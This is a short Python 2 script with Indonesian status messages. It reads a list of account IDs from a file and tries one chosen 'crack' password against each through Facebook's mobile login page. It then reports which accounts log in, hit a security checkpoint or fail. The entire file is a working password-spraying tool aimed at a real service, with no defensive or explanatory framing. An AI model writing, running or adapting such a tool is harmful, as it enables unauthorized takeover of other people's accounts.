import requests


id = raw_input("Input List Id : ")
pw = raw_input("Input Crack Password : ")


def project1(id,pw):
    url = "https://m.facebook.com/login.php"

    data = {"email":id, "pass":pw}
    r = requests.post(url, data=data)

    if "&_rdc=1&_rdr" in r.url:
               print "PASSWORD DI TEMUKAN ", id, "=>", pw
    elif "checkpoint" in r.url:
               print "AKUN CHECKPOINT", id, "=>", pw
    else:
               print "AKUN GAGAL", id, "=>", pw


def project2(id,pw):
    ex = open('juna.txt', "r").readlines()
    for i in ex:
               project1(i.strip(),pw)


try:
    project2(id,pw)


except:
    exit()
